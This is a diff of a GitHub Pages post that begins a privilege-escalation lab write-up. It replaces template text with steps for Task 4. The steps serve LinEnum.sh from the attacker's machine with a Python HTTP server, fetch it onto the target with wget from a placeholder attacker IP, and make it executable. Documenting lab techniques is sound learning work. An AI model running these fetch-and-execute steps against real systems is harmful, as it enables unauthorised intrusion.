@@ -1,25 +1,35 @@
 ---
-title: Yet Another Sample Page
+title: Common Linux PrivEsc detailed wirte-up
 published: true
 ---
+Tasks **1**, **2**, and **3** don't need explanation.
 
-Text can be **bold**, _italic_, ~~strikethrough~~ or `keyword`.
+## [](#header-2)Task 4
 
-[Link to another page](another-page).
+To get LinEnum on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store LinEnum.sh or you will have to provide the path to it afterwards) and connect to it from the target :
 
-There should be whitespace between paragraphs.
+![Python Listener](https://github.com/peixetlift/peixetlift.github.io/blob/master/assets/LinuxPrivEsc/python%20listener%20server4.png)
 
-There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.
+```
+python3 -m http.server 8000
+```
 
-# [](#header-1)Header 1
+>The "-m" option is used to search a module and run the corresponding python script, which in this case is an http server.
+>The number 8000 is the port that our server will be listening in, you can select any port that's not being used.
 
-This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.
+Once the server is started, you can request the file you want from the target's console :
 
-## [](#header-2)Header 2
+```
+wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
+```
+>wget is a network downloader
+>By using this command, we are downloading the file LinEnum.sh from the server in <YOUR MACHINE'S @IP> that we started before.
 
-> This is a blockquote following a header.
->
-> When something is important enough, you do it even if the odds are not in your favor.
+Now that LinEnum.sh is on the target's machine, we need to make it executable, this is done by using :
+
+```
+chmod +x LinEnum.sh
+```
 
 ### [](#header-3)Header 3
 
